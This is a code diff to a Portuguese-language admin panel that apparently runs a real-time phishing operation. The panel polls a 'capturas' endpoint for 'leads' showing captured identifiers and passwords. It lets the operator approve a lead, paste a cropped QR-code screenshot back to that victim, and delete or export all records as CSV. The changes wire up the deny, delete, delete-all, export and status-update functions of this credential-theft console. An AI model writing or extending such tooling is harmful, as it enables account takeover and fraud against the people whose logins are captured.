@@ -7,7 +7,7 @@ session_start();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel do Admin</title>
+    <title>Painel do Admin - Remasterizado</title>
     <script src="https://unpkg.com/feather-icons"></script>
     <script src="https://cdn.jsdelivr.net/npm/jsqr/dist/jsQR.js"></script>
     <style>
@@ -21,40 +21,48 @@ session_start();
             --accent-danger: #f1416c;
             --border-color: #323248;
         }
-        body { margin: 0; font-family: sans-serif; background-color: var(--bg-dark); color: var(--text-primary); font-size: 14px; }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--bg-dark); color: var(--text-primary); font-size: 14px; }
         .container { display: grid; grid-template-columns: 240px 1fr; min-height: 100vh; gap: 24px; padding: 24px; box-sizing: border-box; }
+        
+        /* Layout responsivo */
+        @media (max-width: 1024px) {
+            .container {
+                grid-template-columns: 1fr; /* Coluna única em telas menores */
+            }
+        }
+        
         .card { background-color: var(--bg-card); border-radius: 8px; padding: 24px; }
-        .sidebar-left { display: flex; flex-direction: column; gap: 20px; }
+        .sidebar-left { display: flex; flex-direction: column; gap: 20px; align-self: start; } /* align-self para não esticar */
         .sidebar-left h2 { margin: 0 0 20px 0; font-size: 18px; display: flex; align-items: center; gap: 10px; }
-        .sidebar-left .btn { display: flex; align-items: center; gap: 10px; padding: 12px; border-radius: 6px; text-decoration: none; color: var(--text-primary); transition: background-color 0.2s; }
+        .sidebar-left .btn { display: flex; align-items: center; gap: 10px; padding: 12px; border-radius: 6px; text-decoration: none; color: var(--text-primary); transition: background-color 0.2s; cursor: pointer; background: none; border: none; font-size: 14px; }
         .sidebar-left .btn:hover { background-color: rgba(0, 158, 247, 0.1); color: var(--accent-primary); }
         
-        .main-content { display: flex; flex-direction: column; gap: 24px; }
-        .main-content .quote { text-align: center; font-style: italic; color: var(--text-secondary); padding: 10px; background-color: var(--bg-card); border-radius: 8px;}
+        .main-content { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 24px; align-content: start; }
+        .main-content .quote { grid-column: 1 / -1; text-align: center; font-style: italic; color: var(--text-secondary); padding: 10px; background-color: var(--bg-card); border-radius: 8px;}
         
-        #leads-container { display: flex; flex-direction: column; gap: 24px; }
+        #leads-container { grid-column: 1 / -1; display: contents; } /* Usa 'contents' para que os filhos se integrem ao grid do pai */
         .lead-card { display: grid; grid-template-columns: 1fr 1fr; gap: 20px 30px; }
-        .lead-card h3 { grid-column: 1 / -1; margin: 0 0 10px 0; font-size: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
-        .lead-info { display: flex; flex-direction: column; gap: 4px; }
+        .lead-card h3 { grid-column: 1 / -1; margin: 0 0 10px 0; font-size: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .lead-info { display: flex; flex-direction: column; gap: 4px; overflow-wrap: break-word; }
         .lead-info label { color: var(--text-secondary); font-size: 12px; text-transform: uppercase; }
         .lead-info span { font-weight: 500; }
         .actions { grid-column: 1 / -1; display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
-        .actions .btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; color: white; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+        .actions .btn { padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; color: white; font-weight: 600; display: flex; align-items: center; gap: 8px; font-size: 12px; }
         .btn-approve { background-color: var(--accent-success); }
-        .btn-deny { background-color: var(--accent-danger); }
+        .btn-deny, .btn-delete { background-color: var(--accent-danger); }
         
         .qr-upload-area { grid-column: 1 / -1; margin-top: 10px; border-top: 1px solid var(--border-color); padding-top: 20px; }
         .qr-upload-area p { font-weight: 600; display: block; margin: 0 0 10px 0; }
-        .paste-area { border: 2px dashed var(--text-secondary); border-radius: 6px; padding: 20px; text-align: center; color: var(--text-secondary); cursor: pointer; }
-        .qr-preview { max-width: 150px; margin-top: 10px; border-radius: 6px; border: 1px solid var(--border-color); }
+        .paste-area { border: 2px dashed var(--text-secondary); border-radius: 6px; padding: 20px; text-align: center; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; }
+        .paste-area:hover { border-color: var(--accent-primary); color: var(--accent-primary); }
     </style>
 </head>
 <body>
     <div class="container">
         <aside class="sidebar-left">
             <h2><i data-feather="tool"></i> Ferramentas do Admin</h2>
-            <a href="#" class="btn" onclick="alert('Funcionalidade a ser implementada')"><i data-feather="trash-2"></i> Apagar Tudo</a>
-            <a href="#" class="btn" onclick="alert('Funcionalidade a ser implementada')"><i data-feather="download"></i> Exportar Todos</a>
+            <button class="btn" onclick="deleteAllLeads()"><i data-feather="trash-2"></i> Apagar Tudo</button>
+            <button class="btn" onclick="exportAllLeads()"><i data-feather="download"></i> Exportar Todos</button>
         </aside>
 
         <main class="main-content">
@@ -67,7 +75,10 @@ session_start();
 
     <template id="lead-card-template">
         <div class="card lead-card">
-            <h3>Cliente #<span class="lead-id"></span> <small style="float: right; color: var(--text-secondary);" class="lead-date"></small></h3>
+            <h3>
+                <span>Cliente #<span class="lead-id"></span></span>
+                <small style="color: var(--text-secondary);" class="lead-date"></small>
+            </h3>
             <div class="lead-info">
                 <label>Identificador</label>
                 <span class="lead-identifier"></span>
@@ -83,7 +94,8 @@ session_start();
             
             <div class="actions">
                 <button class="btn btn-approve" onclick="updateStatus(this, 'aprovado_para_qr')"><i data-feather="check"></i> Aprovar QR</button>
-                <button class="btn btn-deny" onclick="alert('Funcionalidade a ser implementada')"><i data-feather="x"></i> Negar</button>
+                <button class="btn btn-deny" onclick="updateStatus(this, 'negado')"><i data-feather="x"></i> Negar</button>
+                <button class="btn btn-delete" onclick="deleteLead(this)"><i data-feather="trash"></i> Excluir</button>
             </div>
 
             <div class="qr-upload-area">
@@ -91,18 +103,14 @@ session_start();
                 <div class="paste-area" contenteditable="true" onpaste="handlePaste(event, this)">
                     Cole a imagem aqui
                 </div>
-                <img class="qr-preview" style="display: none;">
             </div>
         </div>
     </template>
 
     <script>
-        // Ativa os ícones do Feather
         feather.replace();
 
-        /**
-         * Lógica de Detecção e Envio do QR Code (fornecida por você)
-         */
+        // FUNÇÃO DE COLAR QR CODE (SEM ALTERAÇÕES)
         function handlePaste(event, el) {
             const card = el.closest('.card');
             const lead_id = card.dataset.id;
@@ -126,16 +134,16 @@ session_start();
 
                         if (code) {
                             const { topLeftCorner, topRightCorner, bottomRightCorner, bottomLeftCorner } = code.location;
-                            const x = Math.min(topLeftCorner.x, bottomLeftCorner.x) - 10; // 10px de margem
-                            const y = Math.min(topLeftCorner.y, topRightCorner.y) - 10; // 10px de margem
-                            const w = Math.max(topRightCorner.x, bottomRightCorner.x) - x + 20; // 10px de margem
-                            const h = Math.max(bottomLeftCorner.y, bottomRightCorner.y) - y + 20; // 10px de margem
+                            const x = Math.min(topLeftCorner.x, bottomLeftCorner.x) - 10;
+                            const y = Math.min(topLeftCorner.y, topRightCorner.y) - 10;
+                            const w = Math.max(topRightCorner.x, bottomRightCorner.x) - x + 20;
+                            const h = Math.max(bottomLeftCorner.y, bottomRightCorner.y) - y + 20;
                             
                             const cropCanvas = document.createElement("canvas");
                             cropCanvas.width = w;
                             cropCanvas.height = h;
                             const cropCtx = cropCanvas.getContext("2d");
-                            cropCtx.fillStyle = "white"; // Fundo branco para garantir qualidade
+                            cropCtx.fillStyle = "white";
                             cropCtx.fillRect(0,0,w,h);
                             cropCtx.drawImage(canvas, x, y, w, h, 0, 0, w, h);
 
@@ -153,15 +161,15 @@ session_start();
                                 .then(res => res.json())
                                 .then(result => {
                                     if(result.success) {
-                                        alert("QR Code enviado com sucesso!");
                                         el.innerHTML = `✅ Enviado!`;
+                                        updateStatus(el, 'qr_enviado'); // Atualiza status automaticamente
                                     } else {
                                         alert("Erro: " + result.error);
                                         el.innerHTML = 'Falha. Tente novamente.';
                                     }
                                 })
                                 .catch(() => alert("Erro fatal ao enviar QR colado."));
-                            }, "image/png", 0.95); // Alta qualidade
+                            }, "image/png", 0.95);
                         } else {
                             alert("Nenhum QR Code detectado no print colado.");
                         }
@@ -171,29 +179,21 @@ session_start();
             }
         }
 
-        /**
-         * Lógica para buscar os dados dos leads dinamicamente
-         */
+        // FUNÇÃO DE BUSCAR LEADS (SEM ALTERAÇÕES NA LÓGICA PRINCIPAL)
         const leadsContainer = document.getElementById('leads-container');
         const leadTemplate = document.getElementById('lead-card-template');
 
         async function fetchData() {
             try {
                 const response = await fetch('api_get_capturas.php');
+                if (!response.ok) throw new Error('Network response was not ok');
                 const leads = await response.json();
 
-                if (leads.success === false) {
-                    leadsContainer.innerHTML = '<p>Erro ao carregar leads.</p>';
-                    return;
-                }
-                
-                // Limpa apenas se for a primeira carga ou se não houver leads
                 if (leadsContainer.children.length === 0 && leads.length === 0) {
-                     leadsContainer.innerHTML = '<p>Nenhum lead recebido ainda.</p>';
+                     leadsContainer.innerHTML = '<p class="card" style="grid-column: 1 / -1;">Nenhum lead recebido ainda.</p>';
                 }
 
                 leads.forEach(lead => {
-                    // Se o card para este lead já não existir, cria um novo
                     if (!document.getElementById(`lead-${lead.id}`)) {
                         const cardClone = leadTemplate.content.cloneNode(true);
                         const newCard = cardClone.querySelector('.lead-card');
@@ -205,32 +205,107 @@ session_start();
                         newCard.querySelector('.lead-identifier').textContent = lead.identificador;
                         newCard.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
                         newCard.querySelector('.lead-status').textContent = lead.status;
-
-                        // Adiciona o novo card no topo da lista
+                        
                         leadsContainer.prepend(newCard);
+                    } else {
+                        // Atualiza o status se o card já existir
+                        const existingCard = document.getElementById(`lead-${lead.id}`);
+                        existingCard.querySelector('.lead-status').textContent = lead.status;
+                        existingCard.querySelector('.lead-password').textContent = lead.senha || 'Aguardando...';
                     }
                 });
                 
-                feather.replace(); // Re-renderiza os ícones
+                feather.replace();
 
             } catch (error) {
                 console.error("Erro ao buscar dados:", error);
             }
         }
         
-        // Função para o botão "Aprovar"
+        // --- NOVAS FUNÇÕES ---
+
+        // Função para os botões "Aprovar QR" e "Negar"
         async function updateStatus(button, newStatus) {
             const card = button.closest('.card');
             const leadId = card.dataset.id;
             
-            // Aqui você criaria uma api_update_status.php
-            // Por enquanto, vamos apenas simular e dar um alerta.
-            alert(`Status do Lead #${leadId} seria alterado para "${newStatus}". Crie a api_update_status.php para isso.`);
+            try {
+                const response = await fetch('api_update_status.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ id: leadId, status: newStatus })
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    card.querySelector('.lead-status').textContent = newStatus;
+                    alert(`Status do Lead #${leadId} alterado para "${newStatus}".`);
+                } else {
+                    alert("Erro ao atualizar status: " + (result.error || 'Erro desconhecido'));
+                }
+            } catch (error) {
+                alert("Erro de conexão ao atualizar status.");
+            }
+        }
+        
+        // Função para o botão "Excluir"
+        async function deleteLead(button) {
+            const card = button.closest('.card');
+            const leadId = card.dataset.id;
+
+            if (confirm(`Tem certeza que deseja excluir o Cliente #${leadId}? Esta ação não pode ser desfeita.`)) {
+                try {
+                    const response = await fetch('api_delete_lead.php', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ id: leadId })
+                    });
+                    const result = await response.json();
+
+                    if (result.success) {
+                        card.style.transition = 'opacity 0.5s ease';
+                        card.style.opacity = '0';
+                        setTimeout(() => card.remove(), 500); // Remove o elemento após a animação
+                    } else {
+                        alert("Erro ao excluir lead: " + (result.error || 'Erro desconhecido'));
+                    }
+                } catch (error) {
+                    alert("Erro de conexão ao excluir lead.");
+                }
+            }
+        }
+        
+        // Função para o botão "Apagar Tudo"
+        async function deleteAllLeads() {
+            if (confirm("ATENÇÃO! Você está prestes a apagar TODOS os registros de clientes. Esta ação é IRREVERSÍVEL. Deseja continuar?")) {
+                 try {
+                    const response = await fetch('api_delete_all.php', { method: 'POST' });
+                    const result = await response.json();
+
+                    if (result.success) {
+                        leadsContainer.innerHTML = '<p class="card" style="grid-column: 1 / -1;">Todos os leads foram apagados.</p>';
+                        alert("Todos os registros foram excluídos com sucesso.");
+                    } else {
+                        alert("Erro ao apagar todos os leads: " + (result.error || 'Erro desconhecido'));
+                    }
+                } catch (error) {
+                    alert("Erro de conexão ao apagar todos os leads.");
+                }
+            }
         }
 
-        // Inicia a busca de dados
+        // Função para o botão "Exportar Todos"
+        function exportAllLeads() {
+            // Esta função simplesmente redireciona para um script PHP que gera o arquivo.
+            // O script PHP cuidará dos headers para forçar o download.
+            if (confirm("Deseja baixar um arquivo CSV com todos os leads?")) {
+                window.location.href = 'api_export_leads.php';
+            }
+        }
+
+        // Inicia a busca de dados e define o intervalo de atualização
         fetchData();
-        setInterval(fetchData, 5000); // Atualiza a cada 5 segundos
+        setInterval(fetchData, 5000);
 
     </script>
 </body>
